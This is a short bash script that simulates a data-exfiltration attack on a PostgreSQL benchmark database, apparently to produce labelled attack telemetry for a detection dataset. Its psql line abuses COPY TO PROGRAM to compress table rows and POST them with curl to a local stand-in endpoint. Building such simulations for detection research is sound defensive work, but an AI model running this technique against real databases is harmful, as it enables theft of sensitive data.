#!/bin/bash
echo "Simulating Data Exfiltration Attack (Attack 1)..."

/dataset_workspace/logger.sh mark_attack "attack_exfiltration" start

# Exfiltrate sensitive tables to an external location (simulated) by compressing and sending
# This should trigger Postgres COPY TO PROGRAM, a child shell fork (gzip, curl), and a remote connect ()
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"

/dataset_workspace/logger.sh mark_attack "attack_exfiltration" end

echo "Data exfiltration attempted."
